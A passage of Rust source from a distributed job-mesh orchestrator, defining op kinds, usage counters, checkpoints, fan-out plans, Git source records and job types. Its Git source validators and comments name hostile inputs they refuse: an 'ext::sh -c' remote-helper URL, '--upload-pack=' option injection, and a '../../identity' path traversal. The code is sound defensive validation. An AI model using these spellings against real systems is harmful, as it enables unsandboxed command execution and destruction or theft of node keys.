            OpBody::FactsPublish { .. } => StateTopic::Facts,
            OpBody::SessionPolicyPut { .. } => StateTopic::Settings,
            OpBody::SessionPolicyRemove { .. } => StateTopic::Settings,
            OpBody::RetentionPut { .. } => StateTopic::Settings,
            OpBody::RetentionReset { .. } => StateTopic::Settings,
            OpBody::SinkPut { .. } => StateTopic::Settings,
            OpBody::SinkRemove { .. } => StateTopic::Settings,
            OpBody::ReleaseKeyPut { .. } => StateTopic::Settings,
            OpBody::ReleaseKeyRevoke { .. } => StateTopic::Settings,
            OpBody::UpgradePlanPut { .. } => StateTopic::Releases,
            OpBody::ReleasePublish { .. } => StateTopic::Releases,
            OpBody::UpgradePlanCancel { .. } => StateTopic::Releases,
            OpBody::UpgradePlanForce { .. } => StateTopic::Releases,
            OpBody::AuditAppend { .. } => StateTopic::Background,
            OpBody::UsageAdd { .. } => StateTopic::Background,
            OpBody::Checkpoint { .. } => StateTopic::Background,
            OpBody::SinkProgress { .. } => StateTopic::Background,
        }
    }

    /// The variant's own name, for counting a log by what is in it (M31 P0).
    ///
    /// One exhaustive match, for the same reason `mesh_core::compact::compaction`
    /// is one: a variant appended without a label would otherwise be counted as
    /// nothing, and the whole point of the census is that the number an operator
    /// reads accounts for every byte. `&'static str` rather than `Display` so a
    /// caller can key a map on it without allocating per op.
    pub fn kind(&self) -> &'static str {
        match self {
            OpBody::NodeExecutionSet { .. } => "NodeExecutionSet",
            OpBody::ServiceAccountAdd { .. } => "ServiceAccountAdd",
            OpBody::OidcProviderPut { .. } => "OidcProviderPut",
            OpBody::OidcProviderRemove { .. } => "OidcProviderRemove",
            OpBody::OidcAssertionPut { .. } => "OidcAssertionPut",
            OpBody::NodeQuarantineSet { .. } => "NodeQuarantineSet",
            OpBody::NodeTagsSet { .. } => "NodeTagsSet",
            OpBody::MemberAdd { .. } => "MemberAdd",
            OpBody::MemberUpdate { .. } => "MemberUpdate",
            OpBody::MemberRevoke { .. } => "MemberRevoke",
            OpBody::MemberLeft { .. } => "MemberLeft",
            OpBody::InviteCreate { .. } => "InviteCreate",
            OpBody::InviteConsume { .. } => "InviteConsume",
            OpBody::InviteRevoke { .. } => "InviteRevoke",
            OpBody::JobUpsert { .. } => "JobUpsert",
            OpBody::BundleAnnounce { .. } => "BundleAnnounce",
            OpBody::BundleHold { .. } => "BundleHold",
            OpBody::ServiceVersionAdd { .. } => "ServiceVersionAdd",
            OpBody::ServiceHead { .. } => "ServiceHead",
            OpBody::ServiceRemove { .. } => "ServiceRemove",
            OpBody::UserAdd { .. } => "UserAdd",
            OpBody::UserRevoke { .. } => "UserRevoke",
            OpBody::GrantAdd { .. } => "GrantAdd",
            OpBody::GrantRevoke { .. } => "GrantRevoke",
            OpBody::SecretPut { .. } => "SecretPut",
            OpBody::SecretRemove { .. } => "SecretRemove",
            OpBody::SecretRewrap { .. } => "SecretRewrap",
            OpBody::AuditAppend { .. } => "AuditAppend",
            OpBody::FanoutPlan { .. } => "FanoutPlan",
            OpBody::FanoutAdopt { .. } => "FanoutAdopt",
            OpBody::FanoutClosed { .. } => "FanoutClosed",
            OpBody::SourceAdd { .. } => "SourceAdd",
            OpBody::SourceRemove { .. } => "SourceRemove",
            OpBody::SourceSynced { .. } => "SourceSynced",
            OpBody::AttestRootAdd { .. } => "AttestRootAdd",
            OpBody::AttestRootRemove { .. } => "AttestRootRemove",
            OpBody::UserHardwareAttest { .. } => "UserHardwareAttest",
            OpBody::UserHardwareRevoke { .. } => "UserHardwareRevoke",
            OpBody::ReleaseCosign { .. } => "ReleaseCosign",
            OpBody::DeploymentPolicyPut { .. } => "DeploymentPolicyPut",
            OpBody::ServiceSchedulePut { .. } => "ServiceSchedulePut",
            OpBody::ServiceScheduleRemove { .. } => "ServiceScheduleRemove",
            OpBody::RegistryPut { .. } => "RegistryPut",
            OpBody::ShedPut { .. } => "ShedPut",
            OpBody::DeploymentKnobsPut { .. } => "DeploymentKnobsPut",
            OpBody::DeploymentPromote { .. } => "DeploymentPromote",
            OpBody::SecretScopeSet { .. } => "SecretScopeSet",
            OpBody::MeshReset { .. } => "MeshReset",
            OpBody::DeploymentVersionPut { .. } => "DeploymentVersionPut",
            OpBody::DeploymentTagPut { .. } => "DeploymentTagPut",
            OpBody::FactCollectorPut { .. } => "FactCollectorPut",
            OpBody::FactsPublish { .. } => "FactsPublish",
            OpBody::SessionPolicyPut { .. } => "SessionPolicyPut",
            OpBody::SessionPolicyRemove { .. } => "SessionPolicyRemove",
            OpBody::EnrolRequest { .. } => "EnrolRequest",
            OpBody::EnrolDecline { .. } => "EnrolDecline",
            OpBody::UpgradePlanPut { .. } => "UpgradePlanPut",
            OpBody::ReleasePublish { .. } => "ReleasePublish",
            OpBody::UpgradePlanCancel { .. } => "UpgradePlanCancel",
            OpBody::ReleaseKeyPut { .. } => "ReleaseKeyPut",
            OpBody::ReleaseKeyRevoke { .. } => "ReleaseKeyRevoke",
            OpBody::Checkpoint { .. } => "Checkpoint",
            OpBody::UsageAdd { .. } => "UsageAdd",
            OpBody::DeploymentPut { .. } => "DeploymentPut",
            OpBody::DeploymentRemove { .. } => "DeploymentRemove",
            OpBody::DeploymentHealthPut { .. } => "DeploymentHealthPut",
            OpBody::GangPlan { .. } => "GangPlan",
            OpBody::GangAdopt { .. } => "GangAdopt",
            OpBody::GangClosed { .. } => "GangClosed",
            OpBody::DeviceInventoryPut { .. } => "DeviceInventoryPut",
            OpBody::JobsClear { .. } => "JobsClear",
            OpBody::JobCancelForce { .. } => "JobCancelForce",
            OpBody::UpgradePlanForce { .. } => "UpgradePlanForce",
            OpBody::RetentionPut { .. } => "RetentionPut",
            OpBody::RetentionReset { .. } => "RetentionReset",
            OpBody::SinkPut { .. } => "SinkPut",
            OpBody::SinkRemove { .. } => "SinkRemove",
            OpBody::SinkProgress { .. } => "SinkProgress",
            OpBody::SingletonClaim { .. } => "SingletonClaim",
        }
    }
}

/// What a body this build cannot decode is counted as.
///
/// It happens — F0 says a node stores and forwards an op from a newer
/// protocol rather than wedging — and the census must show those bytes
/// rather than quietly omitting them, or the total stops matching the disk.
pub const UNKNOWN_OP_KIND: &str = "unknown";

// ---------------------------------------------------------------------------
// Usage counters (C0 P3, consumed by C1)
// ---------------------------------------------------------------------------

/// How long one usage window covers. One hour: short enough that a
/// principal's recent share responds within a shift, long enough that a
/// busy node publishes a handful of ops an hour per principal rather than
/// one per job.
pub const USAGE_WINDOW_SECS: u64 = 3_600;

/// How far back windows are read. Past this, a window contributes nothing
/// to any share and is eligible to leave the log entirely (C0 P3).
///
/// **This is not a per-node setting and must never become one.** Every node
/// computes every principal's dominant share from the same replicated
/// counters, and two nodes reading different horizons would order their
/// queues differently — which is a fair-share scheduler that is not fair.
/// `[state] compaction_horizon` governs how long a node keeps *bytes*;
/// this governs what anyone *reads*, and only the second is a mesh-wide
/// agreement.
pub const USAGE_DECAY_SECS: u64 = 7 * 24 * 3_600;

/// The window index a moment falls in.
pub fn usage_window(at_micros: u64) -> u64 {
    at_micros / 1_000_000 / USAGE_WINDOW_SECS
}

/// The first microsecond after a window ends.
pub fn usage_window_end_micros(window: u64) -> u64 {
    window
        .saturating_add(1)
        .saturating_mul(USAGE_WINDOW_SECS)
        .saturating_mul(1_000_000)
}

/// Whether a window is still read at `now`.
pub fn usage_window_is_live(window: u64, now_micros: u64) -> bool {
    usage_window_end_micros(window)
        > now_micros.saturating_sub(USAGE_DECAY_SECS.saturating_mul(1_000_000))
}

/// One node's grow-only contribution to one principal's usage in one
/// window — the `(node, principal, window)` partial of C1 §5.2.
///
/// **A G-counter, published as a running total rather than as a delta.**
/// The distinction is the whole reason this merges without coordination:
/// each component takes the *maximum* of what has been seen for a given
/// `(author, principal, window)`, so a duplicate delivery, an out-of-order
/// arrival, or a re-send after a crash can never inflate or lower a share.
/// A delta would need exactly-once delivery, which anti-entropy does not
/// promise and does not need to.
///
/// The author is the op's author — the node that executed the work — and is
/// not repeated in the body.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub struct UsagePartial {
    /// The principal charged: a user key. Not a project, not a namespace —
    /// teams are a selector over users (C1 §5.2).
    pub principal: UserId,
    /// Window index: whole [`USAGE_WINDOW_SECS`] since the epoch.
    pub window: u64,
    /// Running totals for this `(node, principal, window)`, monotonic.
    ///
    /// **These are resource-seconds *reserved*, not consumed** (C1 P1). A
    /// principal who holds thirty-two cores and idles them has still denied
    /// them to everybody else, and a share computed from consumption would
    /// let them do it for free. Measured consumption is a separate question
    /// — "were we efficient" rather than "whose turn" — and lives on the
    /// job record in the archive, not here.
    pub cpu_secs: u64,
    pub mem_mb_secs: u64,
    pub gpu_secs: u64,
    /// Wall-clock seconds of execution charged in this window, and how many
    /// job completions contributed. Carried for the operator's report, not
    /// for the scheduler: neither is a resource, and DRF reads neither.
    pub wall_secs: u64,
    pub jobs: u64,
}

impl UsagePartial {
    /// Merge another partial for the same key into this one. Per-component
    /// max: commutative, idempotent, and monotonic in every argument.
    pub fn absorb(&mut self, other: &UsagePartial) {
        self.cpu_secs = self.cpu_secs.max(other.cpu_secs);
        self.mem_mb_secs = self.mem_mb_secs.max(other.mem_mb_secs);
        self.gpu_secs = self.gpu_secs.max(other.gpu_secs);
        self.wall_secs = self.wall_secs.max(other.wall_secs);
        self.jobs = self.jobs.max(other.jobs);
    }

    /// An empty partial for a `(principal, window)` this node has not
    /// charged yet.
    pub fn empty(principal: UserId, window: u64) -> UsagePartial {
        UsagePartial {
            principal,
            window,
            cpu_secs: 0,
            mem_mb_secs: 0,
            gpu_secs: 0,
            wall_secs: 0,
            jobs: 0,
        }
    }

    /// Add one job's charge to this node's running total. Not a merge —
    /// merges take the max; this is the local accumulation that makes the
    /// max meaningful.
    pub fn charge(&mut self, cpu_secs: u64, mem_mb_secs: u64, gpu_secs: u64, wall_secs: u64) {
        self.cpu_secs = self.cpu_secs.saturating_add(cpu_secs);
        self.mem_mb_secs = self.mem_mb_secs.saturating_add(mem_mb_secs);
        self.gpu_secs = self.gpu_secs.saturating_add(gpu_secs);
        self.wall_secs = self.wall_secs.saturating_add(wall_secs);
        self.jobs = self.jobs.saturating_add(1);
    }

    pub fn is_live(&self, now_micros: u64) -> bool {
        usage_window_is_live(self.window, now_micros)
    }
}

/// One `(node, principal, window)` partial, as it is *indexed and reported*
/// rather than replicated (C1 P1).
///
/// The op-log carries only what the scheduler reads — seven days of hourly
/// windows — because a replicated log that also holds a year of accounting
/// is the database this milestone is built not to become. The record an
/// operator reports on lives in the local history index and the Parquet
/// archive, where it is cheap, queryable and keeps as long as anyone wants.
/// Every node indexes every node's windows, because the counters replicate,
/// so "what did the mesh do last month and for whom" is answerable from any
/// node that was up.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub struct UsageRow {
    /// The node that executed the work and published the counter.
    pub node: NodeId,
    pub principal: UserId,
    pub window: u64,
    pub cpu_secs: u64,
    pub mem_mb_secs: u64,
    pub gpu_secs: u64,
    pub wall_secs: u64,
    pub jobs: u64,
}

impl UsageRow {
    pub fn of(node: NodeId, partial: &UsagePartial) -> UsageRow {
        UsageRow {
            node,
            principal: partial.principal,
            window: partial.window,
            cpu_secs: partial.cpu_secs,
            mem_mb_secs: partial.mem_mb_secs,
            gpu_secs: partial.gpu_secs,
            wall_secs: partial.wall_secs,
            jobs: partial.jobs,
        }
    }

    /// When this window began, in micros — the instant a report sorts and
    /// filters on.
    pub fn at_micros(&self) -> u64 {
        self.window
            .saturating_mul(USAGE_WINDOW_SECS)
            .saturating_mul(1_000_000)
    }
}

// ---------------------------------------------------------------------------
// Checkpoints (C0)
// ---------------------------------------------------------------------------

/// A half-open-free, inclusive `[lo, hi]` span of one author's sequence
/// numbers. `lo <= hi` always; a single seq is `lo == hi`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub struct SeqRange {
    pub lo: u64,
    pub hi: u64,
}

impl SeqRange {
    pub fn new(lo: u64, hi: u64) -> SeqRange {
        SeqRange { lo, hi }
    }

    pub fn contains(&self, seq: u64) -> bool {
        seq >= self.lo && seq <= self.hi
    }

    pub fn len(&self) -> u64 {
        self.hi.saturating_sub(self.lo) + 1
    }

    pub fn is_empty(&self) -> bool {
        self.hi < self.lo
    }
}

/// Compress a sorted, deduplicated seq list into inclusive runs.
pub fn seq_ranges(seqs: &[u64]) -> Vec<SeqRange> {
    let mut out: Vec<SeqRange> = Vec::new();
    for &seq in seqs {
        match out.last_mut() {
            Some(last) if seq == last.hi + 1 => last.hi = seq,
            Some(last) if seq <= last.hi => {}
            _ => out.push(SeqRange::new(seq, seq)),
        }
    }
    out
}

/// The record of one local compaction pass: *this author's* ops in
/// `subsumed` were superseded by later ops of its own, are older than the
/// retention horizon, and have been dropped from its log.
///
/// What a checkpoint deliberately does **not** carry is state. The op that
/// won each LWW register is still in the log — it is the one that was not
/// superseded — so a joiner reconstructs exactly the same `MeshState` from
/// the compacted log as from the full one. A checkpoint is a statement
/// about *absence*, and absence is the only thing a receiver could not
/// otherwise infer.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Checkpoint {
    /// The author's own high-water mark at the moment the pass ran. Every
    /// range in `subsumed` lies at or below it.
    pub through_seq: u64,
    /// Inclusive runs of this author's dropped sequence numbers, sorted and
    /// non-overlapping. Run-length encoded because a compaction pass drops
    /// long contiguous stretches — a year of a counter's updates is one
    /// range, not fifty thousand entries.
    pub subsumed: Vec<SeqRange>,
    /// How many ops the author held before the pass, and after. Carried for
    /// operator legibility only (`meshnode state show` on any peer), never
    /// read by the merge.
    pub ops_before: u64,
    pub ops_after: u64,
    /// The horizon this pass applied, in seconds — so a mesh with mixed
    /// settings is diagnosable from the log itself.
    pub horizon_secs: u64,
}

impl Checkpoint {
    pub fn contains(&self, seq: u64) -> bool {
        self.subsumed.iter().any(|r| r.contains(seq))
    }

    /// Structural validity, checked at merge before anything is recorded:
    /// ranges ordered, non-overlapping, non-empty and within `through_seq`.
    /// A malformed checkpoint is dropped rather than trusted — it is the
    /// one op kind that can make a receiver stop waiting for data.
    pub fn is_well_formed(&self) -> bool {
        let mut prev_hi = 0u64;
        for (i, r) in self.subsumed.iter().enumerate() {
            if r.is_empty() || r.lo == 0 || r.hi > self.through_seq {
                return false;
            }
            if i > 0 && r.lo <= prev_hi {
                return false;
            }
            prev_hi = r.hi;
        }
        true
    }
}

// ---------------------------------------------------------------------------
// Fan-out plans (M5)
// ---------------------------------------------------------------------------

/// Everything a successor needs to finish a fan-out its origin started:
/// the payload, the user's signed authorization (executors re-verify it),
/// the full target list with pre-generated job ids, and the dispatch
/// controls. Replicated as [`OpBody::FanoutPlan`].
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FanoutPlanRecord {
    pub group: FanId,
    pub payload: JobPayload,
    pub env: Vec<(String, String)>,
    pub timeout_secs: Option<u64>,
    pub priority: JobPriority,
    /// The origin node — the initial owner (MASTERPLAN §10.3).
    pub submitter: NodeId,
    pub submitter_user: UserId,
    /// The user's signed request envelope; travels into every sub-job spec.
    pub auth: SignedIpc,
    pub targets: Vec<PlannedTarget>,
    pub controls: FanoutControls,
    pub created_at_micros: u64,
}

/// One planned target of a fan-out. The job id is fixed at plan time so a
/// re-dispatch (spill, retry, adoption) can never double-run: executors
/// treat an already-journaled job id as accepted.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PlannedTarget {
    pub job_id: JobId,
    pub node_id: NodeId,
    pub node_name: String,
}

/// Fan-out dispatch controls (MASTERPLAN §9.3).
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct FanoutControls {
    /// At most this many sub-jobs in flight at once (None = all at once).
    pub max_parallel: Option<u32>,
    /// Stop dispatching new targets once failures reach this threshold.
    pub halt_on_fail: Option<HaltPolicy>,
}

/// `--halt-on-fail 10` (absolute) or `--halt-on-fail 10%` (of total targets).
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum HaltPolicy {
    Count(u32),
    Percent(u8),
}

impl HaltPolicy {
    /// The failure count at which dispatch halts, for a given target total.
    pub fn threshold(&self, total: u32) -> u32 {
        match self {
            HaltPolicy::Count(n) => (*n).max(1),
            HaltPolicy::Percent(p) => {
                let p = u32::from(*p).min(100);
                (total.saturating_mul(p)).div_ceil(100).max(1)
            }
        }
    }

    pub fn parse(s: &str) -> Option<HaltPolicy> {
        let s = s.trim();
        if let Some(pct) = s.strip_suffix('%') {
            let p: u8 = pct.trim().parse().ok()?;
            (p <= 100).then_some(HaltPolicy::Percent(p))
        } else {
            s.parse().ok().map(HaltPolicy::Count)
        }
    }
}

impl std::fmt::Display for HaltPolicy {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            HaltPolicy::Count(n) => write!(f, "{n}"),
            HaltPolicy::Percent(p) => write!(f, "{p}%"),
        }
    }
}

// ---------------------------------------------------------------------------
// Git sources (M5, MASTERPLAN §8.1)
// ---------------------------------------------------------------------------

/// A registered Git source: a watcher (elected among nodes carrying the
/// `git-sync` tag) clones/pulls it on an interval, ingests the tree as a
/// bundle, and auto-bumps the services named in `bump` onto the new bundle.
/// Git being down means staleness, never outage.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GitSource {
    pub name: String,
    pub url: String,
    pub branch: String,
    pub interval_secs: u64,
    /// Services to auto-bump when the source produces a new bundle. The
    /// creator's signature on this record pre-authorizes those bumps
    /// (node-authored service versions carry `source = Some(name)`).
    pub bump: Vec<String>,
    pub created_by: UserId,
    pub created_at_micros: u64,
    /// Signature by `created_by` over [`Self::signing_bytes`], verified at
    /// merge time (content-role users only).
    pub signature: Vec<u8>,
}

impl GitSource {
    /// Is this a source a node may act on? (S5)
    ///
    /// Both fields end up as arguments to `git`, running in the **daemon**
    /// process — not in a job, so none of the Landlock, cgroup or
    /// `env_clear` machinery applies to what happens next. Two things
    /// followed from handing them over unchecked:
    ///
    ///   * `git` has a URL scheme whose entire meaning is "run this shell
    ///     command instead of talking to a server" (`ext::sh -c …`, and its
    ///     siblings). `protocol.ext.allow` defaults to `user`, which permits
    ///     it for exactly this kind of direct clone. That turned the
    ///     `developer` role — "may publish content and run jobs, sandboxed"
    ///     — into unsandboxed code execution on whichever node is elected to
    ///     watch.
    ///   * The name is a directory name. `git-sources/../../identity` is the
    ///     node's own key directory, and the `git reset --hard` on the next
    ///     sync is destructive there.
    ///
    /// Checked where the op is authored *and* again at merge, because a
    /// modified client can skip the first, and once more in `sync_source`,
    /// which is where the argument is actually passed.
    pub fn validate(&self) -> Result<(), String> {
        check_source_name(&self.name)?;
        check_source_url(&self.url)?;
        check_source_branch(&self.branch)?;
        Ok(())
    }

    pub fn signing_bytes(&self) -> Vec<u8> {
        let mut unsigned = self.clone();
        unsigned.signature = Vec::new();
        let mut buf = Vec::with_capacity(128);
        buf.extend_from_slice(b"mw-git-source-v1");
        buf.extend_from_slice(&postcard::to_stdvec(&unsigned).unwrap_or_default());
        buf
    }
}

/// A source name, which is also a directory name under `git-sources/`.
///
/// Deliberately narrower than "a path component that happens to work":
/// letters, digits, dot, dash and underscore, and never `.` or `..`. A name
/// is typed by a person and read back in a table, so nothing is lost by
/// refusing the rest.
pub fn check_source_name(name: &str) -> Result<(), String> {
    if name.is_empty() {
        return Err("a git source needs a name".into());
    }
    if name.len() > 64 {
        return Err("a git source name is at most 64 characters".into());
    }
    if name == "." || name == ".." {
        return Err(format!("{name:?} is not a usable source name"));
    }
    if !name
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
    {
        return Err(format!(
            "a git source name may hold letters, digits, '.', '_' and '-' — {name:?} does not"
        ));
    }
    Ok(())
}

/// A repository address `git clone` may be given.
///
/// An allowlist of transports, not a denylist of dangerous ones: `git`
/// resolves `foo::bar` through a *remote helper* — an executable named
/// `git-remote-foo` — and `ext::` is only the one that ships with a shell in
/// it. Naming the transports that are allowed is the only version of this
/// check that stays correct when git grows another.
///
/// A bare absolute path is allowed and is how a local mirror is watched;
/// `git clone` of a local repository copies objects and runs no hook from
/// the source.
pub fn check_source_url(url: &str) -> Result<(), String> {
    if url.is_empty() {
        return Err("a git source needs a url".into());
    }
    if url.len() > 2048 {
        return Err("that git url is implausibly long".into());
    }
    if url.chars().any(|c| c.is_control() || c == '\0') {
        return Err("a git url may not contain control characters".into());
    }
    if url.starts_with('-') {
        // `git` would read it as an option — `--upload-pack=…` is the
        // classic one — and the argument list is not the place to argue
        // about it.
        return Err("a git url may not begin with '-'".into());
    }
    if url.contains("::") {
        return Err(format!(
            "{url:?} names a git *remote helper*, which runs a program of its own — \
             use an https://, ssh://, git:// or file:// url, a git@host:path, or a local path"
        ));
    }
    const SCHEMES: &[&str] = &["https://", "http://", "ssh://", "git://", "file://"];
    if SCHEMES.iter().any(|s| url.starts_with(s)) {
        return Ok(());
    }
    // scp-like: `git@host:path`, where the authority comes before the first
    // slash. `host:path` without a user is deliberately not accepted — it is
    // indistinguishable from a Windows path and from a helper spelling.
    if let Some((authority, rest)) = url.split_once(':')
        && authority.contains('@')
        && !authority.contains('/')
        && !rest.is_empty()
    {
        return Ok(());
    }
    if url.starts_with('/') {
        return Ok(());
    }
    Err(format!(
        "{url:?} is not a git url this node will clone — use https://, ssh://, git:// or \
         file://, a git@host:path, or an absolute local path"
    ))
}

/// Does `url` use a transport with no server authentication and no
/// integrity — `http://` or `git://` (SEC-21)? Such a source is refused
/// unless the node's `[git] allow_plain` says otherwise, because anyone on
/// the path can hand the watcher a different tree, and the watcher rolls it
/// out to every service the source bumps.
pub fn is_plain_git_url(url: &str) -> bool {
    url.starts_with("http://") || url.starts_with("git://")
}

/// A branch name `git` will accept as a ref, and never as an option.
///
/// A loose reading of `git check-ref-format`: the characters git itself
/// refuses, plus the leading `-` that would make it an argument.
pub fn check_source_branch(branch: &str) -> Result<(), String> {
    if branch.is_empty() {
        return Err("a git source needs a branch".into());
    }
    if branch.len() > 255 {
        return Err("that branch name is implausibly long".into());
    }
    if branch.starts_with('-') {
        return Err("a branch name may not begin with '-'".into());
    }
    if branch.starts_with('/') || branch.ends_with('/') || branch.ends_with(".lock") {
        return Err(format!("{branch:?} is not a valid branch name"));
    }
    if branch.contains("..") || branch.contains("@{") || branch.contains("//") {
        return Err(format!("{branch:?} is not a valid branch name"));
    }
    if branch.chars().any(|c| {
        c.is_control() || c.is_whitespace() || matches!(c, '~' | '^' | ':' | '?' | '*' | '[' | '\\')
    }) {
        return Err(format!("{branch:?} is not a valid branch name"));
    }
    Ok(())
}

/// Signing bytes for a SourceRemove.
pub fn source_remove_signing_bytes(name: &str, by: &UserId) -> Vec<u8> {
    let mut buf = Vec::with_capacity(64);
    buf.extend_from_slice(b"mw-git-source-remove-v1");
    buf.extend_from_slice(name.as_bytes());
    buf.push(0);
    buf.extend_from_slice(&by.0);
    buf
}

/// Signing bytes for a ServiceHead move.
pub fn service_head_signing_bytes(name: &str, version: u32, by: &UserId) -> Vec<u8> {
    let mut buf = Vec::with_capacity(64);
    buf.extend_from_slice(b"mw-svc-head-v1");
    buf.extend_from_slice(name.as_bytes());
    buf.push(0);
    buf.extend_from_slice(&version.to_le_bytes());
    buf.extend_from_slice(&by.0);
    buf
}

/// Signing bytes for a ServiceRemove.
pub fn service_remove_signing_bytes(name: &str, by: &UserId) -> Vec<u8> {
    let mut buf = Vec::with_capacity(64);
    buf.extend_from_slice(b"mw-svc-remove-v1");
    buf.extend_from_slice(name.as_bytes());
    buf.push(0);
    buf.extend_from_slice(&by.0);
    buf
}

/// Durable facts about a member (liveness is ephemeral and travels in
/// gossip, not in ops).
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct MemberInfo {
    pub node_id: NodeId,
    pub name: String,
    /// Candidate endpoints, in preference order (MASTERPLAN §6 WAN-readiness:
    /// more candidate types appear later; the list shape is the contract).
    pub addrs: Vec<String>,
    pub tags: Vec<String>,
    /// Advertised executor capacity: concurrent job slots, derived from
    /// hardware unless capped in config (MASTERPLAN §11). 0 = unknown (a
    /// node that has not announced since M5); the scheduler treats it as 1.
    pub slots: u32,
    pub joined_at_micros: u64,
}

/// The replicated public record of an invite. Deliberately excludes the
/// token's bootstrap list and token signature — the token itself is a join
/// credential and never replicates (MASTERPLAN §4.2).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InvitePublic {
    pub invite_id: InviteId,
    pub expires_at_micros: u64,
    pub uses: u32,
    pub tags: Vec<String>,
    pub created_by: NodeId,
    pub created_by_user: UserId,
    /// Signature by `created_by_user` over [`Self::signing_bytes`],
    /// verified at merge time (only admins may mint invites).
    pub signature: Vec<u8>,
}

impl InvitePublic {
    pub fn signing_bytes(&self) -> Vec<u8> {
        let mut unsigned = self.clone();
        unsigned.signature = Vec::new();
        let mut buf = Vec::with_capacity(96);
        buf.extend_from_slice(b"mw-invite-public-v1");
        buf.extend_from_slice(&postcard::to_stdvec(&unsigned).unwrap_or_default());
        buf
    }
}

/// Signing bytes for an invite revocation.
pub fn invite_revoke_signing_bytes(invite_id: &InviteId, by: &UserId) -> Vec<u8> {
    let mut buf = Vec::with_capacity(64);
    buf.extend_from_slice(b"mw-invite-revoke-v1");
    buf.extend_from_slice(&invite_id.0);
    buf.extend_from_slice(&by.0);
    buf
}

// ---------------------------------------------------------------------------
// Jobs
// ---------------------------------------------------------------------------

/// Signing bytes for a job-history clear.
pub fn jobs_clear_signing_bytes(before_micros: u64, by: &UserId) -> Vec<u8> {
    let mut buf = Vec::with_capacity(64);
    buf.extend_from_slice(b"mw-jobs-clear-v1");
    buf.extend_from_slice(&before_micros.to_le_bytes());
    buf.extend_from_slice(&by.0);
    buf
}

/// Signing bytes for a forced job cancel ([`OpBody::JobCancelForce`]).
pub fn job_cancel_force_signing_bytes(job_id: &crate::JobId, by: &UserId) -> Vec<u8> {
    let mut buf = Vec::with_capacity(64);
    buf.extend_from_slice(b"mw-job-cancel-force-v1");
    buf.extend_from_slice(&job_id.0);
    buf.extend_from_slice(&by.0);
    buf
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum JobState {
    Queued,
    Running,
    Succeeded,
    Failed,
    Cancelled,
    TimedOut,
}

impl JobState {
    pub fn is_terminal(&self) -> bool {
        !matches!(self, JobState::Queued | JobState::Running)
    }

    pub fn as_str(&self) -> &'static str {
        match self {
            JobState::Queued => "queued",
            JobState::Running => "running",
            JobState::Succeeded => "succeeded",
            JobState::Failed => "failed",
            JobState::Cancelled => "cancelled",
            JobState::TimedOut => "timed-out",
        }
    }
}

/// Fan-out grouping (MASTERPLAN §9.3): a single submission that targets many
/// nodes is one *logical* job whose per-target sub-results are ordinary jobs
/// sharing a [`FanId`]. M4 ships grouping + multiplexed streaming; M5 adds
/// halt-on-fail, max-parallel, and origin-failure adoption.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub struct FanoutInfo {
    pub group: crate::FanId,
    /// This target's position in the fan-out (0-based, stable for display).
    pub index: u32,
    pub total: u32,
}

/// The replicated, mesh-visible view of a job. The full record (spec, logs,
/// artifacts) lives on the executing node; this summary is what lets any
/// node answer `meshnode jobs` (MASTERPLAN §9.1).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct JobSummary {
    pub job_id: JobId,
    pub cmd_preview: String,
    /// Runtime label: "bash" | "python" | "ansible" | "exec".
    pub runtime: String,
    pub submitter: NodeId,
    /// The user who submitted the job — the audit "who" (MASTERPLAN §7.4).
    pub submitter_user: UserId,
    pub executor: NodeId,
    pub state: JobState,
    pub exit_code: Option<i32>,
    pub created_at_micros: u64,
    pub started_at_micros: Option<u64>,
    pub finished_at_micros: Option<u64>,
    /// Set when this job is one target of a fan-out submission.
    pub fanout: Option<FanoutInfo>,
    /// LWW merge key for this summary.
    pub updated_hlc: Hlc,
}

impl JobSummary {
    /// Is this job "past" as of `watermark`, and so forgotten by a
    /// [`OpBody::JobsClear`] issued then?
    ///
    /// Read off `finished_at_micros` rather than `created_at_micros`,
    /// because the two only agree on jobs that were already over. A job
    /// still running when the clear was issued finishes after the
    /// watermark and survives — which is the whole promise the button
    /// makes. The `unwrap_or(u64::MAX)` is that promise again for a
    /// terminal summary that somehow carries no finish time: keep it,
    /// rather than guess it away.
    pub fn cleared_by(&self, watermark: u64) -> bool {
        watermark > 0
            && self.state.is_terminal()
            && self.finished_at_micros.unwrap_or(u64::MAX) < watermark
    }
}

/// What a job runs: an ad-hoc bash command (M1) or a resolved service (M2).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum JobPayload {
    Command(String),
    Service(Box<crate::content::ServiceExec>),
    /// A script carried inline rather than fetched from a bundle (§4.7).
    /// Appended, not inserted: postcard encodes a variant by index and job
    /// specs are signed, so `Command` and `Service` keep 0 and 1.
    Script(Box<crate::content::InlineScript>),
}

/// Queue priority (MASTERPLAN §10.2). Orders the executor's pending queue;
/// running jobs are never preempted.
#[derive(
    Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize, Default, Hash,
)]
pub enum JobPriority {
    Low,
    #[default]
    Normal,
    High,
}

impl JobPriority {
    pub fn as_str(&self) -> &'static str {
        match self {
            JobPriority::Low => "low",
            JobPriority::Normal => "normal",
            JobPriority::High => "high",
        }
    }

    pub fn parse(s: &str) -> Option<JobPriority> {
        match s {
            "low" => Some(JobPriority::Low),
            "normal" => Some(JobPriority::Normal),
            "high" => Some(JobPriority::High),
            _ => None,
        }
    }

    /// A deployment's `priority` (1–100, Phase C E10) onto the executor's
    /// three queue classes: up to 33 low, from 67 high, normal between — so
    /// the default of 50 queues exactly as every instance always has.
